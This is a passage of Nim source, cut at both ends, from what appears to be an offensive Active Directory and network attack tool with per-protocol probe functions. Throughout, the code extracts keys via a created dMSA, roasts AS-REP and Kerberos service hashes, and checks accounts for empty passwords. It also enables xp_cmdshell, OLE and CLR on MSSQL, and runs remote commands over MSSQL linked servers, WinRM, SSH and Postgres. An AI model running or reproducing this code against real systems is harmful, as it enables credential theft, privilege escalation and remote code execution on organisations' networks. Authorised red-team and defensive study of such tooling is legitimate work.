      let outCcache = if config.krb5Out.len > 0: config.krb5Out else: getCurrentDir() / (parts.cn & ".ccache")
      node["dmsa_name"] = %parts.cn
      node["dmsa_sam"] = %parts.sam
      node["dmsa_dn"] = %dmsaDn
      node["preceding_dn"] = %config.ldapBadSuccessorTarget
      if dmsaTargetActions.len > 0:
        let targetResult = await ldapclient.applyLdapActions(
          host, writePort, max(config.timeoutMs, 5000),
          config.username, config.password, config.ntlmHash, config.domain,
          dmsaTargetActions, kerberos=config.kerberos)
        node["target_modified"] = %targetResult.success
      let sourceCcache = if config.ccachePath.len > 0: config.ccachePath
                         elif existsEnv("KRB5CCNAME"): getEnv("KRB5CCNAME")
                         else: ""
      let dmsaResult = tgsmod.requestDmsaKeys(
        host, realm, if config.domain.len > 0: config.domain else: writeDnsDomain,
        parts.sam, sourceCcache, outCcache, max(config.timeoutMs, 8000))
      node["kinit_success"] = %dmsaResult.success
      node["ccache"] = %dmsaResult.ccache
      node["kinit_message"] = %dmsaResult.message
      if dmsaResult.success:
        var prevRc4 = ""
        var prevAes256 = ""
        for k in dmsaResult.prevKeys:
          if k.enctype == 23: prevRc4 = k.keyHex
          elif k.enctype == 18: prevAes256 = k.keyHex
        if prevRc4.len > 0:
          node["preceding_rc4"] = %prevRc4
        if prevAes256.len > 0:
          node["preceding_aes256"] = %prevAes256
      if not dmsaResult.success:
        node["message"] = %("dMSA created but key extraction failed: " & dmsaResult.message)
    if writeResult.success and config.ldapCreateKind == "user" and
        config.ldapNewPass.len > 0:
      let verifyDomain =
        if config.domain.len > 0: config.domain else: writeDnsDomain
      let verifyProbe = await ldapclient.probeLdap(
        host, config.port, max(config.timeoutMs, 5000),
        config.ldapName, config.ldapNewPass, verifyDomain, "",
        ldapclient.LdapQueryOptions(rootDse: false),
        kerberos=false)
      node["credential_verified"] = %verifyProbe.authenticated
      node["credential"] = %(config.ldapName & ":" & config.ldapNewPass)
      node["items"].add %*{
        "kind": "verify",
        "dn": "CN=" & config.ldapName & ",CN=Users," & writeBaseDn,
        "success": verifyProbe.authenticated,
        "result_code": verifyProbe.bindResultCode,
        "diagnostic": verifyProbe.bindDiagnostic,
        "message": verifyProbe.message
      }
      if not verifyProbe.authenticated:
        node["success"] = %false
        node["message"] = %("LDAP user created, but credential verification failed: " &
          verifyProbe.message)
      else:
        node["message"] = %"LDAP user created and credential verified"
    return node
  if config.addComputer:
    return await addComputerProbeOne(host, config)
  let needsGroupsForAdmins = config.admins or config.ldapBloodhound
  let queries = ldapclient.LdapQueryOptions(
    rootDse: true,
    users: config.users or config.ldapBloodhound,
    groups: config.groups or needsGroupsForAdmins,
    computers: config.computers or config.ldapBloodhound,
    asreproast: config.asreproast,
    kerberoast: config.kerberoast,
    trusts: config.trusts or config.ldapBloodhound,
    gpos: config.gpos or config.ldapBloodhound,
    schema: config.ldapSchema,
    config: config.ldapConfig,
    fgpp: config.ldapFgpp,
    deleted: config.ldapDeleted,
    locked: config.ldapLocked,
    expiredPasswords: config.ldapExpiredPasswords,
    staleUsers: config.ldapStaleUsers,
    neverLoggedOn: config.ldapNeverLoggedOn,
    unconstrained: config.ldapUnconstrained,
    constrained: config.ldapConstrained,
    rbcdTargets: config.ldapRbcdTargets,
    passwdNotReqd: config.ldapPasswdNotReqd,
    dontExpire: config.ldapDontExpire,
    adminCount: config.ldapAdminCount,
    sites: config.ldapSites,
    subnets: config.ldapSubnets,
    dcs: config.dcs or config.ldapBloodhound,
    admins: config.admins or config.ldapBloodhound,
    dns: config.dns,
    certificateInventory: config.ldapCertInventory,
    customBase: config.ldapBase,
    customFilter: config.customLdapFilter,
    customAttrs: config.ldapAttrs,
    limit: config.queryLimit
  )
  let probe = await ldapclient.probeLdap(
    host, config.port, config.timeoutMs,
    config.username, config.password, config.domain, config.ntlmHash,
    queries, kerberos = config.kerberos, external = config.ldapSchannel,
    certFile = config.ldapCertFile, keyFile = config.ldapAdcsKey
  )
  var usersArr = newJArray()
  for entry in probe.users: usersArr.add ldapEntryJson(entry)
  var groupsArr = newJArray()
  for entry in probe.groups: groupsArr.add ldapEntryJson(entry)
  var computersArr = newJArray()
  for entry in probe.computers: computersArr.add ldapEntryJson(entry)
  var asrepArr = newJArray()
  let asrepRealm =
    if config.domain.len > 0: config.domain
    else: baseDnToDnsName(probe.defaultNamingContext)
  for entry in probe.asreproastable:
    var node = ldapEntryJson(entry)
    let sam = firstAttr(entry, "sAMAccountName")
    if sam.len > 0 and config.asreproast:
      let roast = await asrepmod.requestAsrepHash(host, asrepRealm, sam,
        max(config.timeoutMs, 5000))
      if roast.success:
        node["asrep_hash"] = %roast.hash
      elif roast.message.len > 0:
        node["asrep_error"] = %roast.message
    asrepArr.add node
  if config.asreproast and asrepArr.len == 0 and config.username.len > 0 and
      config.password.len == 0 and config.ntlmHash.len == 0 and not config.kerberos:
    var attrs = newJObject()
    attrs["sAMAccountName"] = %* [config.username]
    var node = %*{"dn": "", "attrs": attrs}
    let roast = await asrepmod.requestAsrepHash(host, asrepRealm, config.username,
      max(config.timeoutMs, 5000))
    if roast.success:
      node["asrep_hash"] = %roast.hash
    elif roast.message.len > 0:
      node["asrep_error"] = %roast.message
    asrepArr.add node
  var kerbArr = newJArray()
  for entry in probe.kerberoastable:
    var node = ldapEntryJson(entry)
    let sam = firstAttr(entry, "sAMAccountName")
    let spns = attrVals(entry, "servicePrincipalName")
    if config.kerberoast and sam.len > 0 and spns.len > 0 and
        (config.password.len > 0 or config.ntlmHash.len > 0):
      var hashes = newJArray()
      for spn in spns:
        let roast = tgsmod.requestTgsHash(host, asrepRealm, config.domain,
          config.username, config.password, config.ntlmHash, spn, sam,
          max(config.timeoutMs, 5000))
        if roast.success:
          hashes.add %*{"spn": spn, "hash": roast.hash}
        elif roast.message.len > 0:
          hashes.add %*{"spn": spn, "error": roast.message}
      node["tgs_hashes"] = hashes
    kerbArr.add node
  var trustsArr = newJArray()
  for entry in probe.trusts: trustsArr.add ldapEntryJson(entry)
  var gposArr = newJArray()
  for entry in probe.gpos: gposArr.add ldapEntryJson(entry)
  var schemaArr = newJArray()
  for entry in probe.schema: schemaArr.add ldapEntryJson(entry)
  var configArr = newJArray()
  for entry in probe.config: configArr.add ldapEntryJson(entry)
  var fgppArr = newJArray()
  for entry in probe.fgpp: fgppArr.add ldapEntryJson(entry)
  var deletedArr = newJArray()
  for entry in probe.deleted: deletedArr.add ldapEntryJson(entry)
  var lockedArr = newJArray()
  for entry in probe.locked: lockedArr.add ldapEntryJson(entry)
  var expiredArr = newJArray()
  for entry in probe.expiredPasswords: expiredArr.add ldapEntryJson(entry)
  var staleArr = newJArray()
  for entry in probe.staleUsers: staleArr.add ldapEntryJson(entry)
  var neverArr = newJArray()
  for entry in probe.neverLoggedOn: neverArr.add ldapEntryJson(entry)
  var unconstrainedArr = newJArray()
  for entry in probe.unconstrained: unconstrainedArr.add ldapEntryJson(entry)
  var constrainedArr = newJArray()
  for entry in probe.constrained: constrainedArr.add ldapEntryJson(entry)
  var rbcdTargetsArr = newJArray()
  for entry in probe.rbcdTargets: rbcdTargetsArr.add ldapEntryJson(entry)
  var passwdNotReqdArr = newJArray()
  for entry in probe.passwdNotReqd:
    var node = ldapEntryJson(entry)
    let sam = firstAttr(entry, "sAMAccountName")
    if sam.len > 0 and (config.ldapPasswdNotReqdAttack or config.ldapPasswdNotReqd):
      let emptyProbe = await ldapclient.probeLdap(host, config.port,
        max(config.timeoutMs, 3000), sam, "", config.domain, "",
        ldapclient.LdapQueryOptions(rootDse: false))
      node["empty_password"] = %emptyProbe.authenticated
    passwdNotReqdArr.add node
  var dontExpireArr = newJArray()
  for entry in probe.dontExpire: dontExpireArr.add ldapEntryJson(entry)
  var adminCountArr = newJArray()
  for entry in probe.adminCount: adminCountArr.add ldapEntryJson(entry)
  var sitesArr = newJArray()
  for entry in probe.sites: sitesArr.add ldapEntryJson(entry)
  var subnetsArr = newJArray()
  for entry in probe.subnets: subnetsArr.add ldapEntryJson(entry)
  var dcsArr = newJArray()
  for entry in probe.dcs: dcsArr.add ldapEntryJson(entry)
  var adminsArr = newJArray()
  for entry in probe.admins: adminsArr.add ldapEntryJson(entry)
  var dnsArr = newJArray()
  for entry in probe.dnsZones: dnsArr.add ldapEntryJson(entry)
  var certInventoryArr = newJArray()
  for entry in probe.certificateInventory:
    certInventoryArr.add certificateInventoryEntryJson(entry)
  var customArr = newJArray()
  for entry in probe.custom: customArr.add ldapEntryJson(entry)
  var saslArr = newJArray()
  for mech in probe.supportedSaslMechanisms: saslArr.add %mech
  result = %*{
    "protocol": "ldap",
    "host": probe.host,
    "port": probe.port,
    "reachable": probe.reachable,
    "speaks_ldap": probe.speaksLdap,
    "anonymous": probe.anonymous,
    "auth_attempted": probe.authAttempted,
    "authenticated": probe.authenticated,
    "username": config.username,
    "auth_domain": config.domain,
    "bind_result_code": probe.bindResultCode,
    "bind_diagnostic": probe.bindDiagnostic,
    "default_naming_context": probe.defaultNamingContext,
    "root_domain_naming_context": probe.rootDomainNamingContext,
    "configuration_naming_context": probe.configurationNamingContext,
    "schema_naming_context": probe.schemaNamingContext,
    "domain_sid": probe.domainSid,
    "domain_functionality": probe.domainFunctionality,
    "forest_functionality": probe.forestFunctionality,
    "dns_host_name": probe.dnsHostName,
    "server_name": probe.serverName,
    "ldap_service_name": probe.ldapServiceName,
    "supported_sasl_mechanisms": saslArr,
    "users": usersArr,
    "groups": groupsArr,
    "computers": computersArr,
    "asreproastable": asrepArr,
    "kerberoastable": kerbArr,
    "trusts": trustsArr,
    "gpos": gposArr,
    "schema": schemaArr,
    "config": configArr,
    "fgpp": fgppArr,
    "deleted": deletedArr,
    "locked": lockedArr,
    "expired_passwords": expiredArr,
    "stale_users": staleArr,
    "never_logged_on": neverArr,
    "unconstrained": unconstrainedArr,
    "constrained": constrainedArr,
    "rbcd_targets": rbcdTargetsArr,
    "passwd_notreqd": passwdNotReqdArr,
    "dont_expire": dontExpireArr,
    "admin_count": adminCountArr,
    "sites": sitesArr,
    "subnets": subnetsArr,
    "dcs": dcsArr,
    "admins": adminsArr,
    "dns_zones": dnsArr,
    "certificate_inventory": certInventoryArr,
    "custom": customArr,
    "message": probe.message
  }
  if probe.authenticated and config.password.len > 0 and
      (config.usernames.len > 0 or config.passwords.len > 0):
    result["password"] = %config.password
    result["credential"] = %(config.username & ":" & config.password)
  if config.ldapBloodhound:
    result["operation"] = %"bloodhound"
    result["bloodhound"] = %*{
      "meta": {
        "type": "nimux-bloodhound",
        "version": 1,
        "domain": config.domain,
        "base_dn": probe.defaultNamingContext,
        "domain_sid": probe.domainSid
      },
      "domains": [{
        "name": config.domain,
        "distinguished_name": probe.defaultNamingContext,
        "object_identifier": probe.domainSid,
        "functional_level": probe.domainFunctionality
      }],
      "users": usersArr,
      "groups": groupsArr,
      "computers": computersArr,
      "trusts": trustsArr,
      "gpos": gposArr,
      "domain_controllers": dcsArr,
      "domain_admins": adminsArr
    }
    if config.ldapBloodhoundOut.len > 0:
      let acesByDn = await collectBloodhoundAclMap(
        host, config, probe.defaultNamingContext, probe.domainSid,
        probe.users, probe.groups, probe.computers, probe.gpos)
      result["bloodhound_output"] = writeBloodhoundFiles(
        config.ldapBloodhoundOut, config.domain, probe.defaultNamingContext,
        probe.domainSid, probe.domainFunctionality,
        probe.users, probe.groups, probe.computers, probe.trusts, probe.gpos,
        acesByDn)
  if config.ldapCountKind.len > 0:
    let key = case config.ldapCountKind
      of "users": "users"
      of "computers": "computers"
      of "groups": "groups"
      of "trusts": "trusts"
      of "gpos": "gpos"
      of "fgpp": "fgpp"
      of "deleted": "deleted"
      of "locked", "locked-users": "locked"
      of "expired-passwords": "expired_passwords"
      of "stale-users": "stale_users"
      of "never-logged-on": "never_logged_on"
      of "certs", "certificates", "cert-inventory", "certificate-inventory": "certificate_inventory"
      of "unconstrained": "unconstrained"
      of "constrained": "constrained"
      of "rbcd-targets", "rbcd": "rbcd_targets"
      of "passwd-notreqd", "passwd-not-reqd", "no-password": "passwd_notreqd"
      of "dont-expire", "dont-expire-password", "no-expiry": "dont_expire"
      of "admincount", "admin-count": "admin_count"
      else: "custom"
    if result.hasKey(key):
      result["operation"] = %"count"
      result["success"] = %true
      result["count_kind"] = %config.ldapCountKind
      result["count"] = %result[key].len

proc winRmProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let hasCreds = config.username.len > 0 and
    (config.password.len > 0 or config.ntlmHash.len > 0)
  if config.remoteCommand.len > 0:
    let commandResult = winrmclient.runWinRmCommand(
      host,
      config.port,
      config.username,
      config.password,
      config.ntlmHash,
      config.domain,
      config.remoteCommand,
      config.useSsl,
      if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
      delegate = config.kerberosDelegate,
      ccache = config.ccachePath,
      krb5Config = config.krb5ConfigPath,
      spnOverride = config.ldapSpn
    )
    return %*{
      "protocol": "winrm",
      "host": commandResult.host,
      "port": commandResult.port,
      "reachable": commandResult.success,
      "speaks_winrm": commandResult.success,
      "command": config.remoteCommand,
      "success": commandResult.success,
      "authenticated": commandResult.success,
      "username": config.username,
      "auth_domain": config.domain,
      "output": commandResult.output,
      "message": commandResult.message
    }

  if hasCreds:
    let authResult =
      if config.kerberos or config.useSsl or config.winRmPath == "/wsman":
        winrmclient.checkWinRmAuth(
          host, config.port,
          config.username, config.password,
          config.ntlmHash, config.domain,
          config.useSsl,
          if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
          if config.retries > 0: config.retries else: 3,
          ccache = config.ccachePath,
          krb5Config = config.krb5ConfigPath,
          spnOverride = config.ldapSpn
        )
      else:
        winrmclient.checkWinRmAuthFast(
          host, config.port,
          config.username, config.password,
          config.ntlmHash, config.domain,
          config.winRmPath,
          config.timeoutMs
        )
    let authLower = authResult.message.toLowerAscii()
    let networkDown =
      "connection refused" in authLower or
      "failed to connect" in authLower or
      "no route" in authLower or
      "network is unreachable" in authLower
    let authRejected =
      "401" in authResult.message or "unauthorized" in authLower or
      "auth rejected" in authLower
    return %*{
      "protocol": "winrm",
      "host": authResult.host,
      "port": authResult.port,
      "reachable": not networkDown,
      "speaks_winrm": authResult.success or authRejected,
      "authenticated": authResult.success,
      "username": config.username,
      "auth_domain": config.domain,
      "path": config.winRmPath,
      "message": authResult.message
    }

  let probe = winrmclient.probeWinRmSync(host, config.port, config.timeoutMs, config.winRmPath)
  result = %*{
    "protocol": "winrm",
    "host": probe.host,
    "port": probe.port,
    "reachable": probe.reachable,
    "speaks_winrm": probe.speaksWinRm,
    "authenticated": false,
    "status_code": probe.statusCode,
    "auth_header": probe.authHeader,
    "server_header": probe.serverHeader,
    "message": probe.message
  }

proc msSqlExecResultToJson(r: mssqlclient.MsSqlExecResult): JsonNode =
  var setsArr = newJArray()
  for rs in r.resultSets:
    var colsArr = newJArray()
    for col in rs.columns: colsArr.add %col.name
    var rowsArr = newJArray()
    for row in rs.rows:
      var rowArr = newJArray()
      for cell in row: rowArr.add %cell
      rowsArr.add rowArr
    setsArr.add %*{"columns": colsArr, "rows": rowsArr}
  var msgsArr = newJArray()
  for m in r.messages:
    msgsArr.add %*{
      "number": m.number,
      "severity": m.severity,
      "state": m.state,
      "is_error": m.isError,
      "text": m.text
    }
  %*{
    "authenticated": r.authenticated,
    "auth_message": r.authMessage,
    "server_version": r.serverVersion,
    "result_sets": setsArr,
    "messages": msgsArr,
    "rows_affected": r.rowsAffected,
    "success": r.success,
    "error": r.error
  }

proc mssqlDangerSql(): string
proc mssqlRunClrOneShot(host: string; config: CliConfig; linkedServer, cmd: string): mssqlclient.MsSqlExecResult
proc mssqlOleSql(cmd: string): string
proc mssqlWrapLinked(server, sql: string): string
proc mssqlWrapLinkedChain(servers: seq[string]; sql: string): string
proc mssqlLoadSqlFile(path: string): string
proc mssqlRunOnSession(session: mssqlclient.MsSqlSession; sql: string): mssqlclient.MsSqlExecResult

proc msSqlProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let hasCreds = config.username.len > 0 and
    (config.password.len > 0 or config.ntlmHash.len > 0 or config.kerberos)
  let probeTimeout = if hasCreds: max(config.timeoutMs, 5000) else: config.timeoutMs
  let database = if config.mssqlDatabase.len > 0: config.mssqlDatabase else: "master"
  let probe = await mssqlclient.probeMsSql(host, config.port, probeTimeout, config.msSqlEncryption)
  result = %*{
    "protocol": "mssql",
    "host": probe.host,
    "port": probe.port,
    "reachable": probe.reachable,
    "speaks_mssql": probe.speaksMsSql,
    "encryption_mode": probe.encryptionMode,
    "version": probe.version,
    "message": probe.message
  }
  if config.kerberos:
    let cacheSource =
      if config.ccachePath.len > 0: "explicit"
      elif getEnv("KRB5CCNAME").len > 0: "env"
      else: "default"
    let principal =
      if config.ccachePath.len > 0:
        pkinitmod.currentCachePrincipal("FILE:" & config.ccachePath)
      else:
        pkinitmod.currentCachePrincipal()
    result["kerberos"] = %*{
      "requested": true,
      "spn": (if config.mssqlSpnOverride.len > 0: config.mssqlSpnOverride else: "MSSQLSvc/" & host),
      "ccache": config.ccachePath,
      "principal": principal,
      "cache_source": cacheSource
    }
  if not hasCreds: return
  let linkedChain = config.mssqlLinkChain
  let baseLinked =
    if linkedChain.len > 0: linkedChain
    elif config.mssqlLinkServer.len > 0: @[config.mssqlLinkServer]
    else: @[]
  if config.mssqlEnumDanger:
    let query = await mssqlclient.runQuery(host, config.port,
      max(config.timeoutMs, 5000), config.username, config.password, database,
      mssqlDangerSql(),
      ntlmHash = config.ntlmHash, domain = config.domain,
      kerberos = config.kerberos,
      linkedServer = "",
      ccache = config.ccachePath, spnOverride = config.mssqlSpnOverride)
    if baseLinked.len > 0:
      result["query"] = msSqlExecResultToJson(await mssqlclient.runQuery(host, config.port,
        max(config.timeoutMs, 5000), config.username, config.password, database,
        mssqlWrapLinkedChain(baseLinked, mssqlDangerSql()),
        ntlmHash = config.ntlmHash, domain = config.domain,
        kerberos = config.kerberos, ccache = config.ccachePath,
        spnOverride = config.mssqlSpnOverride))
      return
    result["query"] = msSqlExecResultToJson(query)
    return
  if config.mssqlEnumImpersonate:
    let sql = "SELECT DISTINCT b.name AS grantee, p.permission_name, p.state_desc FROM sys.server_permissions p JOIN sys.server_principals b ON p.grantee_principal_id = b.principal_id WHERE p.permission_name = 'IMPERSONATE' ORDER BY b.name; " &
      "SELECT name, type_desc, default_database_name FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name;"
    if baseLinked.len > 0:
      result["query"] = msSqlExecResultToJson(await mssqlclient.runQuery(host, config.port,
        max(config.timeoutMs, 5000), config.username, config.password, database,
        mssqlWrapLinkedChain(baseLinked, sql),
        ntlmHash = config.ntlmHash, domain = config.domain,
        kerberos = config.kerberos, ccache = config.ccachePath,
        spnOverride = config.mssqlSpnOverride))
    else:
      result["query"] = msSqlExecResultToJson(await mssqlclient.runQuery(host, config.port,
        max(config.timeoutMs, 5000), config.username, config.password, database,
        sql,
        ntlmHash = config.ntlmHash, domain = config.domain,
        kerberos = config.kerberos, ccache = config.ccachePath,
        spnOverride = config.mssqlSpnOverride))
    return
  if config.mssqlEnableXp or config.mssqlEnableOle or config.mssqlEnableClr:
    let sql =
      if config.mssqlEnableXp:
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
      elif config.mssqlEnableOle:
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;"
      else:
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;"
    let wrapped = if baseLinked.len > 0: mssqlWrapLinkedChain(baseLinked, sql) else: sql
    result["query"] = msSqlExecResultToJson(await mssqlclient.runQuery(host, config.port,
      max(config.timeoutMs, 5000), config.username, config.password, database,
      wrapped,
      ntlmHash = config.ntlmHash, domain = config.domain,
      kerberos = config.kerberos, ccache = config.ccachePath,
      spnOverride = config.mssqlSpnOverride))
    return
  if config.mssqlClrCommand.len > 0:
    let linked = if config.mssqlClrLinkServer.len > 0: config.mssqlClrLinkServer elif baseLinked.len > 0: baseLinked[^1] else: ""
    let exec = mssqlRunClrOneShot(host, config, linked, config.mssqlClrCommand)
    result["exec"] = msSqlExecResultToJson(exec)
    result["exec"]["method"] = %"clr"
    result["exec"]["command"] = %config.mssqlClrCommand
    return
  if config.mssqlOleCommand.len > 0:
    let linked = if config.mssqlOleLinkServer.len > 0: config.mssqlOleLinkServer elif baseLinked.len > 0: baseLinked[^1] else: ""
    let query = await mssqlclient.runQuery(host, config.port,
      max(config.timeoutMs, 5000), config.username, config.password, database,
      mssqlOleSql(config.mssqlOleCommand),
      ntlmHash = config.ntlmHash, domain = config.domain,
      kerberos = config.kerberos, linkedServer = linked,
      ccache = config.ccachePath, spnOverride = config.mssqlSpnOverride)
    result["exec"] = msSqlExecResultToJson(query)
    result["exec"]["method"] = %"ole"
    result["exec"]["command"] = %config.mssqlOleCommand
    return
  if config.remoteCommand.len > 0:
    let linked = if config.mssqlXpLinkServer.len > 0: config.mssqlXpLinkServer elif baseLinked.len > 0: baseLinked[^1] else: ""
    let exec = await mssqlclient.runXpCmdshell(host, config.port,
      max(config.timeoutMs, 5000), config.username, config.password,
      config.remoteCommand,
      ntlmHash = config.ntlmHash, domain = config.domain,
      kerberos = config.kerberos, linkedServer = linked,
      ccache = config.ccachePath, spnOverride = config.mssqlSpnOverride)
    result["exec"] = msSqlExecResultToJson(exec)
    result["exec"]["method"] = %"xp_cmdshell"
    result["exec"]["command"] = %config.remoteCommand
    return
  if config.customLdapFilter.len > 0 or config.mssqlQueryFile.len > 0:
    let sqlText =
      if config.mssqlQueryFile.len > 0: mssqlLoadSqlFile(config.mssqlQueryFile)
      else: config.customLdapFilter
    let query = await mssqlclient.runQuery(host, config.port,
      max(config.timeoutMs, 5000), config.username, config.password, database,
      (if baseLinked.len > 0: mssqlWrapLinkedChain(baseLinked, sqlText) else: sqlText),
      ntlmHash = config.ntlmHash, domain = config.domain,
      kerberos = config.kerberos,
      linkedServer = "",
      ccache = config.ccachePath, spnOverride = config.mssqlSpnOverride)
    result["query"] = msSqlExecResultToJson(query)
    return
  try:
    let session = await mssqlclient.openMsSqlSession(host, config.port,
      max(config.timeoutMs, 5000), config.username, config.password, database,
      ntlmHash = config.ntlmHash, domain = config.domain,
      kerberos = config.kerberos, ccache = config.ccachePath,
      spnOverride = config.mssqlSpnOverride)
    result["authenticated"] = %session.authenticated
    result["server_version"] = %session.serverVersion
    if session.authMessage.len > 0:
      result["auth_error"] = %session.authMessage
    asyncnet.close(session.socket)
  except CatchableError as error:
    result["authenticated"] = %false
    result["auth_error"] = %error.msg.splitLines()[0]

proc rdpProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let probe = await rdpclient.probeRdp(host, config.port, config.timeoutMs, config.rdpProtocols)
  var authenticated = false
  var authChecked = false
  when defined(ssl):
    if probe.speaksRdp and config.username.len > 0:
      authChecked = true
      let r = rdpclient.checkRdpAuth(host, config.port, max(config.timeoutMs, 3000),
        config.username, config.password, config.ntlmHash, config.domain)
      authenticated = r.ok
  result = %*{
    "protocol": "rdp",
    "host": probe.host,
    "port": probe.port,
    "reachable": probe.reachable,
    "speaks_rdp": probe.speaksRdp,
    "selected_protocol": probe.selectedProtocol,
    "authenticated": authenticated,
    "auth_checked": authChecked,
    "username": config.username,
    "auth_domain": config.domain,
    "message": probe.message
  }

proc sshProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let tm = max(config.timeoutMs, 5000)
  if config.shellMode:
    let r = await sshclient.sshShell(host, config.port, tm,
      config.username, config.password)
    return %*{
      "protocol": "ssh", "host": host, "port": config.port,
      "reachable": r.reachable, "banner": r.banner,
      "authenticated": r.authenticated, "username": r.username,
      "is_root": r.isRoot, "auth_message": r.authMessage
    }
  if config.remoteCommand.len > 0:
    let r = await sshclient.sshExec(host, config.port, tm,
      config.username, config.password, config.remoteCommand)
    return %*{
      "protocol": "ssh", "host": host, "port": config.port,
      "reachable": r.reachable, "banner": r.banner,
      "authenticated": r.authenticated, "username": r.username,
      "is_root": r.isRoot, "auth_message": r.authMessage,
      "output": r.output, "stderr": r.stderrOut, "exit_code": r.exitCode
    }
  if config.username.len > 0 and config.password.len > 0:
    let r = await sshclient.sshExec(host, config.port, tm,
      config.username, config.password, "id")
    return %*{
      "protocol": "ssh", "host": host, "port": config.port,
      "reachable": r.reachable, "banner": r.banner,
      "authenticated": r.authenticated, "username": r.username,
      "is_root": r.isRoot, "auth_message": r.authMessage
    }
  let probe = await sshclient.probeSsh(host, config.port, tm)
  return %*{
    "protocol": "ssh", "host": host, "port": config.port,
    "reachable": probe.reachable, "banner": probe.banner,
    "authenticated": false, "username": config.username, "is_root": false,
    "auth_message": ""
  }

proc ftpProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let user = if config.username.len > 0: config.username else: "anonymous"
  let pass = if config.password.len > 0: config.password else: "anonymous@"
  let r = await ftpclient.probeFtp(host, config.port, config.timeoutMs, user, pass, config.ftpLs)
  return %*{
    "protocol": "ftp", "host": host, "port": config.port,
    "reachable": r.reachable, "banner": r.banner,
    "authenticated": r.authenticated, "auth_message": r.authMessage,
    "anonymous": r.anonymous, "features": r.features, "system": r.system,
    "username": user, "listing": r.listing
  }

proc mysqlProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let r = await mysqlclient.probeMySQL(host, config.port, config.timeoutMs,
    config.username, config.password)
  return %*{
    "protocol": "mysql", "host": host, "port": config.port,
    "reachable": r.reachable, "server_version": r.serverVersion,
    "authenticated": r.authenticated, "auth_message": r.authMessage,
    "auth_plugin": r.authPlugin, "current_user": r.currentUser,
    "databases": r.databases, "username": config.username
  }

proc postgresRunCommand(sess: pgclient.PgSession; cmd: string): Future[tuple[output: string; ok: bool; err: string]] {.async.}

proc postgresProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let r = await pgclient.probePostgres(host, config.port, config.timeoutMs,
    config.username, config.password, config.mssqlDatabase, config.useSsl)
  var params = newJObject()
  for k, v in r.parameterStatus.pairs:
    params[k] = %v
  result = %*{
    "protocol": "postgres", "host": host, "port": config.port,
    "ssl": config.useSsl, "reachable": r.reachable,
    "server_version": r.serverVersion,
    "authenticated": r.authenticated, "auth_message": r.authMessage,
    "current_user": r.currentUser, "current_database": r.currentDatabase,
    "databases": r.databases, "username": config.username,
    "parameters": params
  }
  if r.authenticated and (config.postgresQuery.len > 0 or config.remoteCommand.len > 0):
    let sess = await pgclient.openPostgresSession(host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.mssqlDatabase, config.useSsl)
    if not sess.isNil:
      defer: pgclient.postgresClose(sess)
      if config.postgresQuery.len > 0:
        let qr = await pgclient.postgresQuery(sess, config.postgresQuery)
        if qr.ok:
          result["query"] = %config.postgresQuery
          var cols = newJArray()
          for c in qr.columns: cols.add %c
          result["columns"] = cols
          var rows = newJArray()
          for row in qr.rows:
            var jr = newJArray()
            for cell in row: jr.add %cell
            rows.add jr
          result["rows"] = rows
          result["command_tag"] = %qr.commandTag
        else:
          result["query"] = %config.postgresQuery
          result["query_error"] = %qr.err
      if config.remoteCommand.len > 0:
        let (output, ok, err) = await postgresRunCommand(sess, config.remoteCommand)
        result["exec"] = %*{"command": config.remoteCommand, "output": output,
                             "ok": ok, "error": err}

proc httpProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let r = await httpclient.probeHttp(host, config.port, config.timeoutMs,
    config.useSsl, config.username, config.password, config.winRmPath)
  return %*{
    "protocol": if config.useSsl or config.protocol == "https": "https" else: "http",
    "host": host, "port": config.port, "ssl": config.useSsl,
    "reachable": r.reachable, "status_code": r.statusCode, "reason": r.reason,
    "server": r.server, "location": r.location, "content_type": r.contentType,
    "www_authenticate": r.wwwAuthenticate, "title": r.title,
    "body_snippet": r.bodySnippet, "authenticated": r.authenticated,
    "auth_message": r.authMessage, "path": config.winRmPath,
    "username": config.username
  }

proc afpProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let r = await afpclient.probeAfp(host, config.port, config.timeoutMs,
    config.username, config.password)
  return %*{
    "protocol": "afp", "host": host, "port": config.port,
    "reachable": r.reachable, "server_name": r.serverName,
    "machine_type": r.machineType, "afp_versions": r.afpVersions,
    "uams": r.uams, "authenticated": r.authenticated,
    "auth_message": r.authMessage, "username": config.username
  }

proc nfsProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let r = await nfsclient.probeNfs(host, config.port, config.timeoutMs)
  var svcs = newJArray()
  for svc in r.rpcServices:
    svcs.add %*{"prog": svc.prog, "vers": svc.vers, "proto": svc.proto, "port": svc.port}
  var exports = newJArray()
  for ex in r.exports:
    var groups = newJArray()
    for g in ex.groups: groups.add %g
    exports.add %*{"path": ex.path, "groups": groups}
  var nfsVers = newJArray()
  for v in r.nfsVersions: nfsVers.add %v
  return %*{
    "protocol": "nfs", "host": host, "port": config.port,
    "reachable": r.reachable, "rpc_services": svcs,
    "exports": exports, "nfs_versions": nfsVers, "mount_port": r.mountPort
  }

proc webdavProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let r = await webdavclient.probeWebDav(host, config.port, config.timeoutMs,
    config.useSsl, config.username, config.password)
  return %*{
    "protocol": "webdav", "host": host, "port": config.port,
    "ssl": config.useSsl, "reachable": r.reachable,
    "dav_supported": r.davSupported, "dav_classes": r.davClasses,
    "server": r.server, "authenticated": r.authenticated,
    "auth_message": r.authMessage, "username": config.username,
    "listing": r.listing
  }

proc vncProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
